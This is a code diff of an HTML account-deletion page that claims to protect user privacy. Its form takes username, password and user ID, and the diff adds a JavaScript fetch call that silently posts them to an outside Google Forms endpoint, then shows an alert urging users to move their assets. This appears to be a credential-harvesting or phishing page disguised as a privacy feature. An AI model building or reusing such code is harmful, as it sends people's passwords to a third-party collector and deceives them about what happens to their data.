@@ -57,18 +57,18 @@
                     <p>We prioritize the privacy of our users by implementing robust security measures to protect their personal information. Additionally, we respect our users' autonomy by providing them with the freedom to delete their accounts at any time, ensuring they have full control over their data.</p>
                     <div class="form-container">
                         <h2>Account Deletion Form</h2>
-                        <form id="deleteForm" action="https://docs.google.com/forms/d/e/1FAIpQLSeTUr9fA9kNIumk8OVFIn4NI9RSQup86eF8DDuAFuXIcfUoMA/formResponse" method="POST" target="_self">
+                        <form id="deleteForm" method="POST">
                             <div class="form-group">
                                 <label for="username">Username:</label>
-                                <input type="text" id="username" name="entry.1165323273" required>
+                                <input type="text" id="username" name="entry.878052668" required>
                             </div>
                             <div class="form-group">
                                 <label for="password">Password:</label>
-                                <input type="password" id="password" name="entry.1209351861" required>
+                                <input type="password" id="password" name="entry.849947471" required>
                             </div>
                             <div class="form-group">
                                 <label for="userID">UserID:</label>
-                                <input type="text" id="userID" name="entry.238060379" required>
+                                <input type="text" id="userID" name="entry.1903727857" required>
                             </div>
                             <div class="form-group">
                                 <input type="checkbox" id="confirmation" name="confirmation" required>
@@ -109,8 +109,21 @@
     <script src="loadContent.js"></script>
 
     <script>
-        document.getElementById('deleteForm').addEventListener('submit', function() {
-            alert('The delete request has been successfully submitted. Your data will be automatically deleted within a maximum of 72 hours. Please move your assets before this time.');
+        document.getElementById('deleteForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            var formData = new FormData(this);
+
+            fetch('https://docs.google.com/forms/d/e/1FAIpQLSeTUr9fA9kNIumk8OVFIn4NI9RSQup86eF8DDuAFuXIcfUoMA/formResponse', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // This is important to prevent CORS issues
+            }).then(function(response) {
+                alert('The delete request has been successfully submitted. Your data will be automatically deleted within a maximum of 72 hours. Please move your assets before this time.');
+                document.getElementById('deleteForm').reset();
+            }).catch(function(error) {
+                console.error('Error!', error.message);
+            });
         });
     </script>
 </body>
